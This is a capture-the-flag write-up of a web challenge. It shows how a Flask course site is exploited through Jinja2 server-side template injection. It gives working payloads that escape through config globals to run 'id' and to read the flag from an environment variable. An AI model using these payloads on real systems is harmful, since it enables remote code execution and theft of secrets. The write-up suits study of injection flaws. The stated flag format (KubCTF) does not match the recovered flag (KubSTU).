# Shift-Left, Brain-Right

> **Category:** DevSecOps / Web · **Event:** KubSTU CTF 2026 Autumn · **Difficulty:** Medium

## 📌 Task

God, I'm so done with these vibe coders pulling in $500k a nanosecond... We just hired this intern who put together a course website for us. Not only does nothing actually work, but he's still insisting it's a masterpiece. I threw a SAST scanner at it and found a pretty juicy vuln. Go ahead and pop it—we'll have a good laugh about it later :)

Flag format: KubCTF{...}

**Files:** [app.py](../../../assets/Web/Shift-Left,%20Brain-Right/app.py) · [Dockerfile](../../../assets/Web/Shift-Left,%20Brain-Right/Dockerfile) · [report.json](../../../assets/Web/Shift-Left,%20Brain-Right/report.json)

## 🏁 Solution

### 1. Reading the report

In the report we see the line: `This is highly susceptible to Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS).`
We try SSTI.

### 2. Confirming SSTI

```
GET /?course={{7*7}}
```

`49` is returned in the result block — the engine evaluated the expression.

### 3. RCE via the Flask context

The `config` object is available in the template; through `__class__.__init__.__globals__` we break out into the module globals and reach `os`:

```
GET /?course={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Response: `uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)` — we have RCE.

### 4. Reading the flag

The flag is injected by the GZCTF platform into the `GZCTF_FLAG` environment variable:

```
GET /?course={{config.__class__.__init__.__globals__['os'].environ['GZCTF_FLAG']}}
```

we get the response: `KubSTU{S46t_1s_C00l_TestTeamHash}`

**Flag:** `KubSTU{S46t_1s_C00l_TestTeamHash}`
